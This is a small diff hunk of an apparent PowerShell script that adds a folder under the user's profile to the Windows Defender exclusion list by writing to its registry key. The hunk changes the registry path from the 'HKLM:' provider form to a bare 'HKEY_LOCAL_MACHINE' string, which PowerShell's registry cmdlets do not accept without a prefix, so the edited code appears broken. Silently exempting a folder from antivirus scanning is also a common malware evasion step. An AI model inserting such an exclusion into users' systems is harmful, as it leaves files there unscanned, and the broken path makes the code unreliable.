@@ -2,7 +2,7 @@
 $exclusionPath = "$env:USERPROFILE\Library"
 
 # Define the registry path and value name
-$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
+$registryPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
 $valueName = [System.IO.Path]::GetFileName($exclusionPath)
 
 # Add the exclusion path to the Windows Defender registry
